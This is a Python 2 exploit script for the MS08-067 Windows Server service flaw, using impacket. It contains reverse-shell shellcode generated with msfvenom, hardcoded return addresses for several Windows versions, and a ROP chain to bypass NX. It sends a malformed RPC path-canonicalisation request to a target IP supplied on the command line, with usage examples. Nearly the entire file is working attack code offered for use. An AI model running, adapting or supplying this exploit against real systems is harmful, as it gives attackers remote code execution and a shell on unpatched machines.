import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'


#badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#msfvenom -p windows/shell/reverse_tcp LHOST=O.O LPORT=O.O  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x29\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\x09\x54\x7c\x9b\x83\xee\xfc\xe2\xf4\xf5\xbc"
shellcode += "\xfe\x9b\x09\x54\x1c\x12\xec\x65\xbc\xff\x82\x04\x4c"
shellcode += "\x10\x5b\x58\xf7\xc9\x1d\xdf\x0e\xb3\x06\xe3\x36\xbd"
shellcode += "\x38\xab\xd0\xa7\x68\x28\x7e\xb7\x29\x95\xb3\x96\x08"
shellcode += "\x93\x9e\x69\x5b\x03\xf7\xc9\x19\xdf\x36\xa7\x82\x18"
shellcode += "\x6d\xe3\xea\x1c\x7d\x4a\x58\xdf\x25\xbb\x08\x87\xf7"
shellcode += "\xd2\x11\xb7\x46\xd2\x82\x60\xf7\x9a\xdf\x65\x83\x37"
shellcode += "\xc8\x9b\x71\x9a\xce\x6c\x9c\xee\xff\x57\x01\x63\x32"
shellcode += "\x29\x58\xee\xed\x0c\xf7\xc3\x2d\x55\xaf\xfd\x82\x58"
shellcode += "\x37\x10\x51\x48\x7d\x48\x82\x50\xf7\x9a\xd9\xdd\x38"
shellcode += "\xbf\x2d\x0f\x27\xfa\x50\x0e\x2d\x64\xe9\x0b\x23\xc1"
shellcode += "\x82\x46\x97\x16\x54\x3c\x4f\xa9\x09\x54\x14\xec\x7a"
shellcode += "\x66\x23\xcf\x61\x18\x0b\xbd\x0e\xab\xa9\x23\x99\x55"
shellcode += "\x7c\x9b\x20\x90\x28\xcb\x61\x7d\xfc\xf0\x09\xab\xa9"
shellcode += "\xf1\x0c\x3c\x76\x90\x09\x7d\x14\x99\x09\x45\x20\x12"
shellcode += "\xef\x04\x2c\xcb\x59\x14\x2c\xdb\x59\x3c\x96\x94\xd6"
shellcode += "\xb4\x83\x4e\x9e\x3e\x6c\xcd\x5e\x3c\xe5\x3e\x7d\x35"
shellcode += "\x83\x4e\x8c\x94\x08\x91\xf6\x1a\x74\xee\xe5\xbc\x1d"
shellcode += "\x9b\x09\x54\x16\x9b\x63\x50\x2a\xcc\x61\x56\xa5\x53"
shellcode += "\x56\xab\xa9\x18\xf1\x54\x02\xad\x82\x62\x16\xdb\x61"
shellcode += "\x54\x6c\x9b\x09\x02\x16\x9b\x61\x0c\xd8\xc8\xec\xab"
shellcode += "\xa9\x08\x5a\x3e\x7c\xcd\x5a\x03\x14\x99\xd0\x9c\x23"
shellcode += "\x64\xdc\xd7\x84\x9b\x74\x76\x24\xf3\x09\x14\x7c\x9b"
shellcode += "\x63\x54\x2c\xf3\x02\x7b\x73\xab\xf6\x81\x2b\xf3\x7c"
shellcode += "\x3a\x31\xfa\xf6\x81\x22\xc5\xf6\x58\x58\x72\x78\xab"
shellcode += "\x83\x64\x08\x97\x55\x5d\x7c\x93\xbf\x20\xe9\x49\x56"
shellcode += "\x91\x61\xf2\xe9\x26\x94\xab\xa9\xa7\x0f\x28\x76\x1b"
shellcode += "\xf2\xb4\x09\x9e\xb2\x13\x6f\xe9\x66\x3e\x7c\xc8\xf6"
shellcode += "\x81\x7c\x9b"


nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
